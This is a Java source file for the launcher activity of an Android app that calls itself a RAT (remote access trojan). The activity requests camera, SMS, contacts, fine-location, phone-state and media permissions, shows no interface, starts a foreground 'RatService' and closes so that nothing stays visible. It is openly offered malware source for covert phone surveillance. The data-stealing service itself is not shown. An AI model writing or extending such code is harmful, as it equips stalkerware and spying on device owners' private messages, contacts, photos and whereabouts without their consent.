package com.company.rat;

import android.Manifest;
import android.app.Activity;
import android.content.*;
import android.content.pm.PackageManager;
import android.os.*;
import android.util.Log;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import java.util.*;

/**
 * Minimal launcher activity.
 *
 * 1. Requests all runtime permissions in one shot
 * 2. Prompts user to enable Accessibility if not already enabled
 * 3. Starts RatService as a foreground service
 * 4. Finishes (no visible UI — activity disappears after launch)
 *
 * On re-launch the activity just moves the service to foreground and exits.
 */
public class MainActivity extends Activity {

    private static final String TAG     = "MainActivity";
    private static final int    REQ_ALL = 100;

    private static final String[] PERMISSIONS = {
        Manifest.permission.CAMERA,
        Manifest.permission.READ_EXTERNAL_STORAGE,
        Manifest.permission.READ_MEDIA_IMAGES,
        Manifest.permission.READ_MEDIA_VIDEO,
        Manifest.permission.READ_SMS,
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.READ_PHONE_STATE,
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        // No setContentView — no visible UI
        requestMissingPermissions();
    }

    private void requestMissingPermissions() {
        List<String> needed = new ArrayList<>();
        for (String p : PERMISSIONS) {
            if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED)
                needed.add(p);
        }

        if (!needed.isEmpty()) {
            ActivityCompat.requestPermissions(this, needed.toArray(new String[0]), REQ_ALL);
        } else {
            proceed();
        }
    }

    @Override
    public void onRequestPermissionsResult(int req, String[] perms, int[] grants) {
        // Proceed regardless — some permissions may be denied, service handles gracefully
        proceed();
    }

    private void proceed() {
        // Start the main RAT service
        Intent svc = new Intent(this, RatService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
            startForegroundService(svc);
        else
            startService(svc);

        // Finish — no window stays visible
        finish();
    }
}
